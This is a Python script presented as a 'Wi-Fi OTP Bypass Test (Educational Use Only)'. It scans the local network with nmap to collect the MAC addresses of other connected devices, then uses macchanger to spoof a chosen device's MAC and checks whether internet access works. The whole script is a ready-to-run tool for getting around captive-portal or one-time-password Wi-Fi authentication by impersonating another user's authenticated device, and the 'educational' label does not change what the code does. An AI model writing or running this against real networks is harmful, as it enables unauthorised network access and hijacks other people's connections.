import os
import subprocess
import time

def install_macchanger():
    """Installs macchanger if not already installed."""
    try:
        # Run the command to install macchanger using apt
        subprocess.run(["sudo", "apt", "install", "-y", "macchanger"], check=True)
    except subprocess.CalledProcessError:
        print("Error installing macchanger. Ensure you have sudo privileges.")

def scan_network(ip_range):
    """Uses nmap to scan the network and retrieve MAC addresses."""
    try:
        print("Scanning network for devices...")
        # Run nmap to perform a ping scan over the specified IP range
        result = subprocess.run(["sudo", "nmap", "-sn", ip_range], stdout=subprocess.PIPE, text=True)
        mac_addresses = []
        for line in result.stdout.splitlines():
            # Extract MAC addresses from the scan output
            if "MAC Address" in line:
                mac_addresses.append(line.split()[2])
        return mac_addresses
    except subprocess.CalledProcessError:
        print("Error running nmap. Ensure you have nmap installed and sudo privileges.")
        return []

def change_mac(interface, new_mac):
    """Changes the MAC address of the specified interface."""
    try:
        # Bring the network interface down
        subprocess.run(["sudo", "ifconfig", interface, "down"], check=True)
        # Change the MAC address using macchanger
        subprocess.run(["sudo", "macchanger", "-m", new_mac, interface], check=True)
        # Bring the network interface back up
        subprocess.run(["sudo", "ifconfig", interface, "up"], check=True)
        print(f"Successfully changed MAC address to {new_mac}")
    except subprocess.CalledProcessError:
        print("Error changing MAC address. Ensure you have sudo privileges.")

def test_connection():
    """Tests internet connectivity by pinging google.com."""
    try:
        # Test connectivity by pinging Google's public DNS server
        subprocess.run(["ping", "-c", "3", "google.com"], check=True)
        print("Internet is working!")
        return True
    except subprocess.CalledProcessError:
        print("Internet is not working.")
        return False

def main():
    print("Starting Wi-Fi OTP Bypass Test (Educational Use Only)")
    # Ensure macchanger is installed
    install_macchanger()

    # Ask user for the IP range to scan
    ip_range = input("Enter the local IP range to scan (e.g., 192.168.1.1/24): ")
    
    # Scan the network for connected devices
    mac_addresses = scan_network(ip_range)
    if not mac_addresses:
        print("No MAC addresses found. Ensure you're connected to the Wi-Fi.")
        return

    print("Found MAC addresses:")
    for index, mac in enumerate(mac_addresses):
        print(f"{index}: {mac}")

    # Prompt user for the Wi-Fi interface name
    interface = input("Enter your Wi-Fi interface (e.g., wlan0): ")

    while True:
        try:
            # Ask the user to select a MAC address by its index
            choice = int(input("Select a MAC address by entering its index: "))
            if choice < 0 or choice >= len(mac_addresses):
                print("Invalid selection. Try again.")
                continue
            selected_mac = mac_addresses[choice]
            print(f"Attempting with MAC address: {selected_mac}")

            # Change MAC address to the selected one
            change_mac(interface, selected_mac)
            print("Testing internet connection...")
            time.sleep(5)  # Wait for the network to stabilize
            if test_connection():
                print(f"Successfully connected to the internet with MAC address: {selected_mac}")
                break
            else:
                print("Internet not working. Try selecting another MAC address.")
        except ValueError:
            print("Invalid input. Please enter a number corresponding to the MAC address index.")

if __name__ == "__main__":
    main()
